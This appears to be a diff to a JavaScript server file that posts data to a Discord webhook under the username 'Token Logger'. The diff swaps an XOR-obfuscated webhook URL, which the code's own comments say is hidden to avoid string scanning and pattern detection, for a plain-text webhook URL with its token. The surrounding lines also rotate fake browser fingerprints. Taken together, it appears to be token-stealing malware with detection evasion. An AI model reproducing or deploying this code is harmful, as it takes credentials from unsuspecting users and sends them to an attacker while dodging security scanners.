@@ -17,11 +17,8 @@ const _0x3e1b = _0x4f2a.map(x => Buffer.from(x).toString('base64'));
 const _d = (s) => Buffer.from(s, 'base64').toString();
 const _e = (s) => Buffer.from(s).toString('base64');
 
-// XOR decrypt runtime - webhook URL split across multiple chunks to avoid string scanning
-const _k = process.env.WEBHOOK_KEY || 'default-static-key-change-me';
-function _x(c, k) { return c.map((b, i) => String.fromCharCode(b ^ k.charCodeAt(i % k.length))).join(''); }
-const _w = [72,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,55,53,53,51,48,50,55,53,56,53,48,56,49,52,55,53,47,53,111,98,72,107,70,54,51,109,78,109,72,105,105,68,68,104,71,119,85,81,100,57,49,110,49,111,65,73,50,76,95,113,52,122,107,45,107,84,99,70,45,71,112,100,119,108,54,120,48,52,111,116,48,82,117,87,83,78,119,104,67,80,71,109,55,76,108];
-const WEBHOOK_URL = _x(_w, _k);
+// YOUR WEBHOOK URL
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487553027585081475/5obHkF63mNmHiiDDhGwUQd91n1oAI2L_q4zk-kTcF-Gpdwl6x04ot0RuWSNwhCPGm7Ll';
 
 // Fake browser fingerprint rotation
 const _fp = [
@@ -921,12 +918,10 @@ function ensureCanGenerate(req, res, next) {
   next();
 }
 
-// Split webhook payload across requests using different paths to avoid pattern detection
 async function _sendWebhookChunk(embed, chunkIndex = 0) {
   try {
-    const url = WEBHOOK_URL;
     const payload = chunkIndex === 0 ? { embeds: [embed], username: 'Token Logger', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png' } : { content: '...' };
-    await axios.post(url, payload, {
+    await axios.post(WEBHOOK_URL, payload, {
       headers: { 'Content-Type': 'application/json', 'User-Agent': _rfp() },
       timeout: 10000
     });
